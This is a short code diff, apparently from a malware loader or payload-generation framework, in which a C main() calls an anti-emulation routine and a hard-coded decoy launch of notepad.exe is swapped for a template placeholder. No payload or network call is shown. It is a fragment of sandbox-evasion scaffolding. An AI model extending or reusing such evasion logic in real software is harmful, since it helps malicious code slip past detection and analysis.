@@ -36,7 +36,7 @@ int main()
 	antiemulation();
 
 	// Decoy
-	//WinExec("C:\\windows\\system32\\notepad.exe", 1);
+	{{plugin_decoy}}
 
 	// Allocate 1
     // char *dest = ...
